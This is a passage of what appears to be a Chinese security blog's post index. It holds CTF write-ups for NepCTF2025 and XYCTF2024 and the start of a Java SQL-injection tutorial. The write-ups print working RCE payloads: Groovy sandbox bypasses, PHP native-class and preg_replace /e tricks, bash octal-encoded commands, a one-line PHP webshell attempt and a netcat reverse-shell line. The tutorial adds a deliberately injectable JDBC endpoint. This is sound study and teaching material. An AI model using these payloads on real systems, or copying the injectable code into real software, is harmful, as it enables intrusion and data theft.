如果我们调用的方法是execute，就会触发黑名单并抛出错误\n\n上面都没有的话就会返回true\n\n### 方法一:属性访问表达式绕过\n\n其实上面的安全逻辑本来是希望我们只能调用String对象中的方法的，让我们的代码都只能是被当作字符串去调用操作，但是这里明显在外层if语句里存在一个问题，就是这里只检查了函数调用表达式而不管其他类型的表达式\n\n![image-20250726031051869](../image/achieve/202411/NepCTF2025/image-20250726031051869.png)\n\n然后可以想到，this.class是属于PropertyExpression属性访问表达式，之前在学习java反序列化的时候就接触过，每个java类运行时都会实例化一个 java.lang.Class 的实例。并且例如我们在脚本中调用方法println的话实际上就是在调用this.println()，所以this.class在脚本中实际上就是在访问该类的对象实例，那么就能间接访问到java.lang.Class 的实例，同时也就绕过第一层if，直接返回true了\n\n```java\nthis.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"env\").getText()\n```\n\n### 方法二:getClass()方法绕过\n\n```java\ngetClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"env\").getText()\n```\n\n为什么这里可以呢，其实也很简单，因为这里并不符合内层的两个if语句，既不是String对象的方法，也不是execute方法，所以也就不会触发异常抛出，同样可以返回true\n\n![image-20250726032302337](../image/achieve/202411/NepCTF2025/image-20250726032302337.png)\n\n## JavaSeri\n\n### #shiro550\n\n感觉被资本做局了，从题目上线到比赛结束，我每次打开环境都是跳转127.0.0.1，不知道为啥，赛后拿朋友开的环境直接就打开了。。。\n\n![image-20250729105943641](../image/achieve/202411/NepCTF2025/image-20250729105943641.png)\n\n看到一个shiro和remember me，直接猜测是shiro550反序列化，拿工具一把梭吧\n\n![image-20250729110039455](../image/achieve/202411/NepCTF2025/image-20250729110039455.png)\n\n然后探测利用链并RCE就行了\n\n![image-20250729223430058](../image/achieve/202411/NepCTF2025/image-20250729223430058.png)\n\n![image-20250729223648725](../image/achieve/202411/NepCTF2025/image-20250729223648725.png)\n","tags":["NepCTF2025"],"categories":["赛题wp"]},{"title":"Java常用框架下的SQL注入","url":"/2025/07/18/Java常用框架下的SQL注入/","content":"\n## 0x01JDBC下的SQL注入\n\n### 什么是JDBC？\n\nJDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。通常我们的Java程序需要访问数据库的时候，都是需要通过JDBC去进行访问的，类似于PHP中的PDO和MYSQLi接口。\n\nJDBC中通常存在两种方法去执行SQL语句，分别是Statement和PreparedStatement，Statement会直接拼接sql语句造成SQL注入，而PreparedStatement顾名思义会对sql语句进行一个预编译，从而避免了直接造成的sql注入漏洞\n\n### Statement下的SQL注入\n\n我们可以本地写一个demo去测试一下\n\n我这里的话是用本地搭建的SpringBoot框架去做的一个测试\n\n```java\n@RequestMapping(\"/jdbc/vuln\")\npublic String jdbc_sqli_vul(@RequestParam(\"username\") String username) {\n    StringBuilder result = new StringBuilder();\n    try {\n        Class.forName(driver);\n        Connection con = DriverManager.getConnection(url, user, password);\n        // sqli vuln code\n        Statement statement = con.createStatement();\n        String sql = \"select * from users where username = '\" + username + \"'\";\n        logger.info(sql);\n        ResultSet rs = statement.executeQuery(sql);\n        while (rs.next()) {\n            String res_name = rs.getString(\"username\");\n            String res_pwd = rs.getString(\"password\");\n            String info = String.format(\"%s: %s\\n\", res_name, res_pwd);\n            result.append(info);\n            logger.info(info);\n        }\n        rs.close();\n        con.close();\n    } catch (ClassNotFoundException e) {\n        logger.error(\"Sorry,can`t find the Driver!\");\n    } catch (SQLException e) {\n        logger.error(e.toString());\n    }\n    return result.toString();\n}\n```\n\n","tags":["SQL注入"],"categories":["javasec"]},{"title":"XYCTF2024复现","url":"/2025/07/16/XYCTF2024复现/","content":"\n## ezMake\n\n扫了一下目录发现有flag文件，下载下来就是flag，不过好像这不是预期解\n\n![image-20250402151235637](../image/achieve/202411/XYCTF2024/image-20250402151235637.png)\n\n传入一个1之后有回显\n\n![image-20250402151459724](../image/achieve/202411/XYCTF2024/image-20250402151459724.png)\n\n分析一下内容\n\n这里PATH变量被设置为空，这段 Makefile 的逻辑检查了 PATH 是否未定义，如果未定义则设为空，如果已定义也重设为空。因为**`make` 命令本身也依赖 PATH 查找**，当PATH被设置为空之后，\n\n![image-20250402152913741](../image/achieve/202411/XYCTF2024/image-20250402152913741.png)\n\n但是测试之后发现Bash内置命令是可以执行的\n\n- 内置命令列表\n\n| 命令      | 说明                                                  |\n| :-------- | :---------------------------------------------------- |\n| :         | 扩展参数列表，执行重定向操作                          |\n| .         | 读取并执行指定文件中的命令（在当前 shell 环境中）     |\n| alias     | 为指定命令定义一个别名                                |\n| bg        | 将作业以后台模式运行                                  |\n| bind      | 将键盘序列绑定到一个 readline 函数或宏                |\n| break     | 退出 for、while、select 或 until 循环                 |\n| builtin   | 执行指定的 shell 内建命令                             |\n| caller    | 返回活动子函数调用的上下文                            |\n| cd        | 将当前目录切换为指定的目录                            |\n| command   | 执行指定的命令，无需进行通常的 shell 查找             |\n| compgen   | 为指定单词生成可能的补全匹配                          |\n| complete  | 显示指定的单词是如何补全的                            |\n| compopt   | 修改指定单词的补全选项                                |\n| continue  | 继续执行 for、while、select 或 until 循环的下一次迭代 |\n| declare   | 声明一个变量或变量类型。                              |\n| dirs      | 显示当前存储目录的列表                                |\n| disown    | 从进程作业表中刪除指定的作业                          |\n| echo      | 将指定字符串输出到 STDOUT                             |\n| enable    | 启用或禁用指定的内建shell命令                         |\n| eval      | 将指定的参数拼接成一个命令，然后执行该命令            |\n| exec      | 用指定命令替换 shell 进程                             |\n| exit      | 强制 shell 以指定的退出状态码退出                     |\n| export    | 设置子 shell 进程可用的变量                           |\n| fc        | 从历史记录中选择命令列表                              |\n| fg        | 将作业以前台模式运行                                  |\n| getopts   | 分析指定的位置参数                                    |\n| hash      | 查找并记住指定命令的全路径名                          |\n| help      | 显示帮助文件                                          |\n| history   | 显示命令历史记录                                      |\n| jobs      | 列出活动作业                                          |\n| kill      | 向指定的进程 ID(PID) 发送一个系统信号                 |\n| let       | 计算一个数学表达式中的每个参数                        |\n| local     | 在函数中创建一个作用域受限的变量                      |\n| logout    | 退出登录 shell                                        |\n| mapfile   | 从 STDIN 读取数据行，并将其加入索引数组               |\n| popd      | 从目录栈中删除记录                                    |\n| printf    | 使用格式化字符串显示文本                              |\n| pushd     | 向目录栈添加一个目录                                  |\n| pwd       | 显示当前工作目录的路径名                              |\n| read      | 从 STDIN 读取一行数据并将其赋给一个变量               |\n| readarray | 从 STDIN 读取数据行并将其放入索引数组                 |\n| readonly  | 从 STDIN 读取一行数据并将其赋给一个不可修改的变量     |\n| return    | 强制函数以某个值退出，这个值可以被调用脚本提取        |\n| set       | 设置并显示环境变量的值和 shell 属性                   |\n| shift     | 将位置参数依次向下降一个位置                          |\n| shopt     | 打开/关闭控制 shell 可选行为的变量值                  |\n| source    | 读取并执行指定文件中的命令（在当前 shell 环境中）     |\n| suspend   | 暂停 Shell 的执行，直到收到一个 SIGCONT 信号          |\n| test      | 基于指定条件返回退出状态码 0 或 1                     |\n| times     | 显示累计的用户和系统时间                              |\n| trap      | 如果收到了指定的系统信号，执行指定的命令              |\n| type      | 显示指定的单词如果作为命令将会如何被解释              |\n| typeset   | 声明一个变量或变量类型。                              |\n| ulimit    | 为系统用户设置指定的资源的上限                        |\n| umask     | 为新建的文件和目录设置默认权限                        |\n| unalias   | 刪除指定的别名                                        |\n| unset     | 刪除指定的环境变量或 shell 属性                       |\n| wait      | 等待指定的进程完成，并返回退出状态码                  |\n\n```\nubuntu@VM-16-12-ubuntu:/$ PATH=\nubuntu@VM-16-12-ubuntu:/$ echo \"1\"\n1\nubuntu@VM-16-12-ubuntu:/$ pwd\n/\n```\n\n尝试用echo写木马但是遇到waf了\n\n```\necho \"<?php eval($_POST['cmd']); ?>\" > 1.php\n```\n\n用base64和hex绕过也不行\n\n```\necho \"PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=\" | base64 -d > 1.php\n```\n\n试一下用Bash里的.去执行flag文件就行\n\n```\n. flag\n```\n\n![image-20250402154804684](../image/achieve/202411/XYCTF2024/image-20250402154804684.png)\n\n当然还有其他的命令\n\n```\necho $(shell cat flag)\n```\n\n解释一下payload\n\n| `$(...)`         | **命令替换**，先执行 `...` 里的命令，返回其输出（STDOUT） |\n| ---------------- | --------------------------------------------------------- |\n| `shell cat flag` | 尝试执行 `shell` 命令，并传 `cat flag` 作为参数           |\n| `echo ...`       | 打印命令替换后的结果                                      |\n\n## ez?Make\n\n一样的页面，但是扫目录里是看不到flag了，有个Makefile路径，把Makefile文件下下来看看\n\n```\nSHELL := /bin/bash\n.PHONY: FLAG\nFLAG: /flag\n\t1\n```\n\n这里指定了在执行shell命令时使用/bin/bash而不是默认的/bin/sh，这里和上面的题目不一样，这里不仅限于bash内置命令\n\n但是这里禁用了很多命令，测试后发现cd是可以用的\n\n![image-20250402184608575](../image/achieve/202411/XYCTF2024/image-20250402184608575.png)\n\n![image-20250402184557046](../image/achieve/202411/XYCTF2024/image-20250402184557046.png)\n\n因为已知flag在根目录，所以尝试直接读取flag，但是这里很多读取文件的命令都被禁用了，不过more可以用，然后就是绕过flag的关键字过滤了，也过滤了`*`和`?`看看用`[]`去匹配，一开始是用`[a-z]`的，但是发现被过滤了，不过好在用[0-z]能匹配出来\n\n```\ncd .. && cd .. && cd ..&&more [0-z][0-z][0-z][0-z]\n```\n\n![image-20250402185222669](../image/achieve/202411/XYCTF2024/image-20250402185222669.png)\n\n或者也可以cd到bin目录下执行bash命令\n\n```\ncd .. && cd .. && cd ..&& cd bin && echo \"bHM=\" | b[0-z]se64 -d | b[0-z]sh\n执行ls命令\n```\n\n![image-20250402185609304](../image/achieve/202411/XYCTF2024/image-20250402185609304.png)\n\n然后我们cat /flag就可以了\n\n```\ncd .. && cd .. && cd ..&& cd bin && echo \"Y2F0IC9mbGFn\" | b[0-z]se64 -d | b[0-z]sh\n```\n\n## ezhttp\n\n### #请求头伪造\n\n一个登录页面，有账号有密码登录框\n\n扫i目录扫出很多东西\n\n```\n[19:01:03] Scanning:\n[19:01:34] 200 -     0B - /flag.php\n[19:01:36] 200 -    1KB - /index.php\n[19:01:37] 200 -    1KB - /index.php/login/\n[19:01:48] 200 -    35B - /robots.txt\n[19:01:49] 403 -   279B - /server-status/\n[19:01:49] 403 -   279B - /server-status\n```\n\n访问/robots.txt有一个/l0g1n.txt\n\n```\nusername: XYCTF\npassword: @JOILha!wuigqi123$\n```\n\n拿到账密了，登录有显示\n\n```\n登录成功！\n不是 yuanshen.com 来的我不要\n```\n\n伪造请求头，抓包处理吧，这里直接放修改的地方了\n\n```\nReferer: yuanshen.com // 从yuanshen.com来的\nUser-Agent: XYCTF //用XYCTF浏览器\nClient-IP: 127.0.0.1 // 本地用户伪造，不用xff（X-Forward-For）\nVia: ymzx.qq.com //从ymzx.qq.com代理\nCookie: XYCTF //想吃点XYCTF的小饼干\n```\n\n![image-20250402191734884](../image/achieve/202411/XYCTF2024/image-20250402191734884.png)\n\n## ezClass\n\n```php\n<?php\nhighlight_file(__FILE__);\n$a=$_GET['a'];\n$aa=$_GET['aa'];\n$b=$_GET['b'];\n$bb=$_GET['bb'];\n$c=$_GET['c'];\n( (new $a($aa) )->$c() )( (new $b($bb) )->$c() );\n```\n\n`((new $a($aa))->$c())((new $b($bb))->$c());`：动态创建两个对象，并调用它们的方法，然后将第二个对象方法的返回值作为参数传递给第一个对象方法。第一个的返回值需要是一个函数，而第二个的返回值是作为参数传递给第一个返回的函数。\n\n这里第一个想到的是利用原生类中的方法去写马\n\n### #Error内置类实现RCE\n\n可以用Error内置类去打，其中Error::getMessage方法可以返回Error类实例化时接受的字符串\n\n```php\n<?php\n$a = new Error(\"wanth3f1ag\");\necho $a->getMessage();\n\necho \"\\n\";\n\n$b = ((new Error(\"123456\"))->getMessage());\necho $b;\n//wanth3f1ag\n//123456\n```\n\n所以基本思路就是创建两个error类分别给system和cat /flag两个参数，再用getMessage方法把输进去的参数当作字符串返回\n\n![image-20250402194903136](../image/achieve/202411/XYCTF2024/image-20250402194903136.png)\n\n```\nGET:?a=Error&aa=system&c=getMessage&b=Error&bb=ls /\n等价于\n((new Error('system'))->getMessage())((new $Error('ls /'))->getMessage());\n等价于\nsystem('ls /')\n?a=SplFileObject&aa=data://text/plain,system&c=__toString&b=SplFileObject&bb=data://text/plain,cat%20/flag\n```\n\n![image-20250402194428990](../image/achieve/202411/XYCTF2024/image-20250402194428990.png)\n\n### #SplFileObject内置类+data伪协议\n\n也用SplFileObject内置类去打，我们先看看SplFileObjectp类中有什么内容\n\n```php\nclass SplFileObject extends SplFileInfo implements RecursiveIterator, SeekableIterator {\n/* 常量 */\npublic const int DROP_NEW_LINE;\npublic const int READ_AHEAD;\npublic const int SKIP_EMPTY;\npublic const int READ_CSV;\n/* 方法 */\npublic __construct(\n    string $filename,\n    string $mode = \"r\",\n    bool $useIncludePath = false,\n    ?resource $context = null\n)\npublic current(): string|array|false\npublic eof(): bool\npublic fflush(): bool\npublic fgetc(): string|false\npublic fgetcsv(string $separator = \",\", string $enclosure = \"\\\"\", string $escape = \"\\\\\"): array|false\npublic fgets(): string\npublic fgetss(string $allowable_tags = ?): string\npublic flock(int $operation, int &$wouldBlock = null): bool\npublic fpassthru(): int\npublic fputcsv(\n    array $fields,\n    string $separator = \",\",\n    string $enclosure = \"\\\"\",\n    string $escape = \"\\\\\",\n    string $eol = \"\\n\"\n): int|false\npublic fread(int $length): string|false\npublic fscanf(string $format, mixed &...$vars): array|int|null\npublic fseek(int $offset, int $whence = SEEK_SET): int\npublic fstat(): array\npublic ftell(): int|false\npublic ftruncate(int $size): bool\npublic fwrite(string $data, int $length = 0): int|false\npublic getChildren(): null\npublic getCsvControl(): array\npublic getFlags(): int\npublic getMaxLineLen(): int\npublic hasChildren(): false\npublic key(): int\npublic next(): void\npublic rewind(): void\npublic seek(int $line): void\npublic setCsvControl(string $separator = \",\", string $enclosure = \"\\\"\", string $escape = \"\\\\\"): void\npublic setFlags(int $flags): void\npublic setMaxLineLen(int $maxLength): void\npublic __toString(): string\npublic valid(): bool\n/* 继承的方法 */\npublic SplFileInfo::getATime(): int|false\npublic SplFileInfo::getBasename(string $suffix = \"\"): string\npublic SplFileInfo::getCTime(): int|false\npublic SplFileInfo::getExtension(): string\npublic SplFileInfo::getFileInfo(?string $class = null): SplFileInfo\npublic SplFileInfo::getFilename(): string\npublic SplFileInfo::getGroup(): int|false\npublic SplFileInfo::getInode(): int|false\npublic SplFileInfo::getLinkTarget(): string|false\npublic SplFileInfo::getMTime(): int|false\npublic SplFileInfo::getOwner(): int|false\npublic SplFileInfo::getPath(): string\npublic SplFileInfo::getPathInfo(?string $class = null): ?SplFileInfo\npublic SplFileInfo::getPathname(): string\npublic SplFileInfo::getPerms(): int|false\npublic SplFileInfo::getRealPath(): string|false\npublic SplFileInfo::getSize(): int|false\npublic SplFileInfo::getType(): string|false\npublic SplFileInfo::isDir(): bool\npublic SplFileInfo::isExecutable(): bool\npublic SplFileInfo::isFile(): bool\npublic SplFileInfo::isLink(): bool\npublic SplFileInfo::isReadable(): bool\npublic SplFileInfo::isWritable(): bool\npublic SplFileInfo::openFile(string $mode = \"r\", bool $useIncludePath = false, ?resource $context = null): SplFileObject\npublic SplFileInfo::setFileClass(string $class = SplFileObject::class): void\npublic SplFileInfo::setInfoClass(string $class = SplFileInfo::class): void\npublic SplFileInfo::__toString(): string\n}\n```\n\n由于这里$c是调用的方法，在最后一行中两边是一致的，但是跟Error中一样的，这里也有一个`__toString`方法\n\n```\nSplFileObject::__toString —以字符串形式返回当前行\n```\n\n在本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# cat test.php \n<?php phpinfo(); ?>\nroot@VM-16-12-ubuntu:/var/www/html# vim 1.php\nroot@VM-16-12-ubuntu:/var/www/html# cat 1.php \n<?php \n$a = new SplFileObject(\"test.php\");\necho $a->__toString();\nroot@VM-16-12-ubuntu:/var/www/html# php 1.php \n<?php phpinfo(); ?>\n```\n\n但是这里因为是两个部分的调用返回值进行配合，并且当前目录下的内容是不可知的，所以不能直接读取flag文件，也是需要写命令执行语句\n\n这里需要配合data伪协议去输出,data伪协议可以动态生成文件而无需真实文件。通过data伪协议去包装数据，使得我们可以**输出 `data://` 包装的数据**\n\n```php\n<?php\n$a = new SplFileObject(\"data://text/plain,system\");\necho $a->__toString();\n//system\n```\n\n所以我们最终的payload就是\n\n```\n?a=SplFileObject&aa=data://text/plain,system&c=__toString&b=SplFileObject&bb=data://text/plain,cat%20/flag\n```\n\n## ezRCE\n\n### #无字母RCE\n\n```php\n<?php\nhighlight_file(__FILE__);\nfunction waf($cmd){\n    $white_list = ['0','1','2','3','4','5','6','7','8','9','\\\\','\\'','$','<']; \n    $cmd_char = str_split($cmd);\n    foreach($cmd_char as $char){\n        if (!in_array($char, $white_list)){\n            die(\"really ez?\");\n        }\n    }\n    return $cmd;\n}\n$cmd=waf($_GET[\"cmd\"]);\nsystem($cmd);\nreally ez?\n```\n\n这里需要我们传入的cmd符合白名单中的字符，否则就会执行die语句\n\n无字母RCE\n\nbashfuck的用法，需要配合$0环境变量去使用\n\n- `\\$0` 是 **Shell 环境中的一个特殊变量**，代表 **当前 Shell 或脚本的名称**。\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# echo $0\nbash\n```\n\n- **`<<<`** → **Here String**（输入字符串作为标准输入）\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# $0<<<'id'\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n这里可以看到id命令成功被执行\n\n因为这里有白名单过滤，所以我们需要用数字编码去转换我们的命令\n\npayload\n\n```\n?cmd=$0<<<$%27\\154\\163\\040\\057%27\n等价于\necho 'ls /' | /bin/bash\n\\154\\163\\040\\057是ls /的八进制\n```\n\n推荐文章：https://www.freebuf.com/articles/system/361101.html\n\n## warm up\n\n### #PHP特性\n\n```php\n<?php\ninclude 'next.php';\nhighlight_file(__FILE__);\n$XYCTF = \"Warm up\";\nextract($_GET);\n\nif (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {\n    echo \"ez\" . \"<br>\";\n} else {\n    die(\"什么情况,这么基础的md5做不来\");\n}\n\nif (isset($md5) && $md5 == md5($md5)) {\n    echo \"ezez\" . \"<br>\";\n} else {\n    die(\"什么情况,这么基础的md5做不来\");\n}\n\nif ($XY == $XYCTF) {\n    if ($XY != \"XYCTF_550102591\" && md5($XY) == md5(\"XYCTF_550102591\")) {\n        echo $level2;\n    } else {\n        die(\"什么情况,这么基础的md5做不来\");\n    }\n} else {\n    die(\"学这么久,传参不会传?\");\n}\n\n什么情况,这么基础的md5做不来\n```\n\n用extract($_GET);代码可以实现变量覆盖，直接GET传入变量的值就行\n\n先看第一层，就是简单的md5弱比较，用数组绕过或者强碰撞都行\n\n```\n?val1[]=1&val2[]=2\n```\n\n再看第二层，需要变量在md5后的值弱等于初始值，也就是需要找个以0e开头的并且该值md5加密后也是0e开头\n\n```\n?val1[]=1&val2[]=2&md5=0e215962017\n```\n\n然后看第三层，需要$XY和$XYCTF的值符合弱相等，然后就是里面的md5比较，先算一下`XYCTF_550102591`在md5加密后的值\n\n```php\n<?php\n$a = \"XYCTF_550102591\";\necho md5($a);\n//0e937920457786991080577371025051\n```\n\n0e开头的，那还是强碰撞，但是想到这里能进行变量覆盖，那我们可以对$XYCTF的值进行修改，所以随便传入一个强碰撞相等的值就行\n\n```\n?val1[]=1&val2[]=2&md5=0e215962017&XY=QLTHNDT&XYCTF=QLTHNDT\n```\n\n然后拿到LLeeevvveeelll222.php文件\n\n访问一下\n\n```php\n<?php\nhighlight_file(__FILE__);\nif (isset($_POST['a']) && !preg_match('/[0-9]/', $_POST['a']) && intval($_POST['a'])) {\n    echo \"操作你O.o\";\n    echo preg_replace($_GET['a'],$_GET['b'],$_GET['c']);  // 我可不会像别人一样设置10来个level\n} else {\n    die(\"有点汗流浃背\");\n}\n\n有点汗流浃背\n```\n\n这里先需要满足第一层才能进行操作，既要a为数字也要a不包含数字,preg_match() 只能处理字符串，遇到数组时会返回 false，!false就是true，满足条件\n\n```\na[]=2\n```\n\n第二层就是关于preg_replace在/e模式下的rce了，这里三个参数都可控，就简单的多\n\n```\n?a=/a/e&c=a&b=system('ls /')\n```\n\n![image-20250403162908127](../image/achieve/202411/XYCTF2024/image-20250403162908127.png)\n\n## ezmd5\n\n### #md5图片碰撞\n\n需要上传两个图片，根据题目说的md5，估计是需要上传两个不一样的图片但是md5一样的\n\n直接用md5碰撞生成工具(fastcoll)生成就行，也可以直接去网上找现成的图片\n\n![船舶图像](../image/achieve/202411/XYCTF2024/ship.jpg)\n\n![平面图像](../image/achieve/202411/XYCTF2024/plane.jpg)\n\n这两张图片具有相同的 md5 哈希值：253dd04e87492e4fc3471de5e776bc3d\n\n![image-20250403164408218](../image/achieve/202411/XYCTF2024/image-20250403164408218.png)\n\n## 牢牢记住，逝者为大\n\n```php\n<?php\nhighlight_file(__FILE__);\nfunction Kobe($cmd)\n{\n    if (strlen($cmd) > 13) {\n        die(\"see you again~\");\n    }\n    if (preg_match(\"/echo|exec|eval|system|fputs|\\.|\\/|\\\\|/i\", $cmd)) {\n        die(\"肘死你\");\n    }\n    foreach ($_GET as $val_name => $val_val) {\n        if (preg_match(\"/bin|mv|cp|ls|\\||f|a|l|\\?|\\*|\\>/i\", $val_val)) {\n            return \"what can i say\";\n        }\n    }\n    return $cmd;\n}\n\n$cmd = Kobe($_GET['cmd']);\necho \"#man,\" . $cmd  . \",manba out\";\necho \"<br>\";\neval(\"#man,\" . $cmd . \",mamba out\");\n\n#man,,manba out\n```\n\n这里限制了很多\n\n- cmd的字符不能超过13个\n- 过滤了很多命令函数和操作符\n\n另外在eval函数中有`#man`注释，我们需要避开这个坑，避免我们传入的代码被注释掉，然后在后面还有多余的数据\n\n首先先试着能让我们的eval能执行\n\n过注释符#\n\n```php\n<?php\n$a = \"\\n echo '1';#\";\neval(\"#\". $a .\"2323\");\n//1\n```\n\n用换行符可以逃逸注释，但是这里过滤了`\\`\n\n根据URL编码规则，我们用%0a去代替`\\n`，本地测试一下\n\n```php\n<?php\nhighlight_file(__FILE__);\n$a = $_GET['a'];\neval(\"#\". $a .\"2323\");\n```\n\n传入a\n\n```\n?a=%0a echo '1';%23\n```\n\n注意# 是 URL 的锚点标识符，这里需要对#进行编码成%23，否则会被认为是URL本身的分隔符，\n\n根据**`\\n` 和 `\\r` 在 HTTP 请求中的特殊作用**，如果 `\\n` 不经编码直接传入 `?a=\\n123`，服务器或浏览器可能会错误地认为 `\\n` 是 **HTTP 请求结束符**，导致参数被截断。所以我们的`\\n`也是需要编码成URL编码才能起作用的\n\n编码之后PHP后对参数a进行解码\n\n```\n?a=\\n echo '1';#\n```\n\n![image-20250403171617983](../image/achieve/202411/XYCTF2024/image-20250403171617983.png)\n\n绕过这两个的问题解决了，接下来就是如何绕过过滤进行rce了\n\n如果上面两个是必须的，那么此时我们已经消耗掉了三个字符（注意，这里不是七个字符，因为后端PHP会进行解码，所以最后是三个字符），那么只能传入最多10个字符\n\n这么多函数禁用了，这时候可以用反引号内联执行，在反引号中可以放入系统命令，可以用带参数输入的方式\n\n```\n`$_GET[1]`\n```\n\n刚好10个字符，然后可以传入1，但是这里对get的参数都有过滤，还不能换成post，限制的死死的，是要我们去绕过\n\n不能写文件(>被过滤)，不能操作文件（mv，cp被过滤），也不能看目录（ls，被过滤），还无法用通配符去匹配文件（?，*）被过滤\n\n但是这些命令可以用单双引号去绕过，那么方法就很多了（注意这里是无回显的）\n\n### 方法1：cp复制flag\n\n```\n?cmd=%0a`$_GET[1]`;%23&1=c''p /[@-z][@-z][@-z]g 1.txt\n```\n\n虽然不能用`?`和`*`通配符，但是可以用`[]`去匹配单个字符，这里执行cp命令后访问1.txt就可以拿到flag了\n\n### 方法2：反弹shell\n\n无回显的RCE，直接反弹shell\n\n```\nnc [host] [port] -e /bi''n/sh\n```\n\n![image-20250403175559834](../image/achieve/202411/XYCTF2024/image-20250403175559834.png)\n\n### 方法3：数字编码绕过\n\n```\n?cmd=%0a`$_GET[1]`;%23&1=$'\\143\\160' $'\\57\\146\\154\\141\\147' 1.txt\n//cp /flag的8进制\n然后访问1.txt就行\n```\n\n根据**Bash 的 `$'...'` ANSI-C Quoting 机制**，`$'...'` 会在 **Shell 解析阶段**（执行命令前）把 `\\xxx`（八进制）转换成 **对应的 ASCII 字符**。所有 **`$'\\xxx'` 拼接后**，最终会合并为 **可执行的 Shell 命令**\n\n## εZ?¿м@Kε¿?\n\nhint：`Μακεϝ1LE>1s<S0<ϜxxΚ1ηG_ξ2!@<>#>%%#!$*&^(!`\n\n才发现是和前面两个题一样的makefile\n\n```\n[18:09:36] Scanning:\n[18:10:33] 200 -    38B - /hint.php\n[18:10:35] 200 -    2KB - /index.html\n```\n\n访问/hint.php\n\n```\n/^[$|\\(|\\)|\\@|\\[|\\]|\\{|\\}|\\<|\\>|\\-]+$/\n```\n\n估计是正则匹配的表达式\n\n先输出可用字符\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/^[$|\\(|\\)|\\@|\\[|\\]|\\{|\\}|\\<|\\>|\\-]+$/\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n\n?>\n//! \" # % & ' * + , . / 0 1 2 3 4 5 6 7 8 9 : ; = ? A B C D E F G H I J K L M N O P Q R S T U V W X Y Z \\ ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z ~ \n```\n\n一开始以为是有这么多字符可以用，后面才发现这个表达式是需要匹配的，而并非不能匹配的,也就是白名单\n\n```php\n#输出可用字符\n<?php\nfor ($i=32;$i<127;$i++){\n        if (preg_match(\"/^[$|\\(|\\)|\\@|\\[|\\]|\\{|\\}|\\<|\\>|\\-]+$/\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n\n?>\n//$ ( ) - < > @ [ ] { | } \n```\n\n学习一下关于Makefile中的$@, $^, $< , $?, $%, $+, $*\n\n参考文章：[Makefile中的$@, $^, $< , $?, $%, $+, $*](https://blog.csdn.net/dlf1769/article/details/78997967)\n\n```\n$@  表示目标文件\n$^  表示所有的依赖文件\n$<  表示第一个依赖文件\n$?  表示比目标还要新的依赖文件列表\n$% 仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是“foo.a(bar.o)”，那么，“$%”就是“bar.o”，“$@”就是“foo.a”。如果目标不是函数库文件（Unix下是[.a]，Windows下是[.lib]），那么，其值为空。\n\n$+ 这个变量很像“$^”，也是所有依赖目标的集合。只是它不去除重复的依赖目标。\n\n$* 这个变量表示目标模式中“%”及其之前的部分。如果目标是“dir/a.foo.b”，并且目标的模式是“a.%.b”，那么，“$*”的值就是“dir/a.foo”。这个变量对于构造有关联的文件名是比较有较。如果目标中没有模式的定义，那么“$*”也就不能被推导出，但是，如果目标文件的后缀是make所识别的，那么“$*”就是除了后缀的那一部分。例如：如果目标是“foo.c”，因为“.c”是make所能识别的后缀名，所以，“$*”的值就是“foo”。这个特性是GNU make的，很有可能不兼容于其它版本的make，所以，你应该尽量避免使用“$*”，除非是在隐含规则或是静态模式中。如果目标中的后缀是make所不能识别的，那么“$*”就是空值。\n```\n\n传入`$<`，有回显/flag，随后我们要读取，要用 < 重定向符读取，用于从文件中读取内容\n\n我们测试一下输入 <$< 回显了</flag\n\n随后我们要读取到一个地方，也没有什么地方能读取，只能读取到变量里那么我们就能构造出\n\npayload\n\n```\n$(<$<)\n```\n\n但是还是读取不了，回显\n\n```\nmake: Nothing to be done for 'FLAG'.\n```\n\n这个时候我们就要用到转义符号 $ ，这是因为在 Makefile 中， $ 符号是特殊字符，需要转义才\n\n能正常使用，所以就得到了最终的payload\n\n```\n$$(<$<)\n```\n\n有点神奇。。全程跟着wp做的，但还是得理解一下\n\n从内到外去理解一下\n\n首先需要理解的是重定向符\n\n### 重定向符`<`\n\n在 Shell（如 Bash）中，`<` 是一个 **输入重定向（Input Redirection）符号**，用于 **将文件内容作为命令的输入**。\n\n语法\n\n```\n命令 < 文件\n```\n\n那么<$< 回显了</flag，此时根据这个特点，我们可以把flag文件的内容当成是命令的输入，然后我们需要解决如何输出这个命令或者是读取这个命令\n\n### $(<$<)\n\n**`$( <$< )`** → **读取输入并执行命令**\n\n在 Bash 中，`$( command )` 的语法是 **命令替换（Command Substitution）**，它的作用是：\n\n1. **执行 `command` 并捕获其标准输出（stdout）**。\n2. **将命令的输出结果替换到当前位置**。\n\n例如我们本地测试一下\n\n```\nroot@VM-16-12-ubuntu:/var/www/html# cat 1.php\n123\nroot@VM-16-12-ubuntu:/var/www/html# $(<1.php)\n123: command not found\n```\n\n### 最终payload\n\n`$$(<$<)`：其实和上面的一样，只不过\n\n在 Makefile 中：\n\n- **单个 `$`** → 被 Make 解析（用于变量或自动化变量，如(CC)‘、‘(*CC*)‘、‘@`）。\n- **`$$`** → 转义为 **单个 `$`** 并传递给 Shell（避免 Make 解析）。\n\n## ezPOP\n\n### #GC回收绕过\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass AAA\n{\n    public $s;\n    public $a;\n    public function __toString()\n    {\n        echo \"you get 2 A <br>\";\n        $p = $this->a;\n        return $this->s->$p;\n    }\n}\n\nclass BBB\n{\n    public $c;\n    public $d;\n    public function __get($name)\n    {\n        echo \"you get 2 B <br>\";\n        $a=$_POST['a'];\n        $b=$_POST;\n        $c=$this->c;\n        $d=$this->d;\n        if (isset($b['a'])) {\n            unset($b['a']);\n        }\n        call_user_func($a,$b)($c)($d);\n    }\n}\n\nclass CCC\n{\n    public $c;\n\n    public function __destruct()\n    {\n        echo \"you get 2 C <br>\";\n        echo $this->c;\n    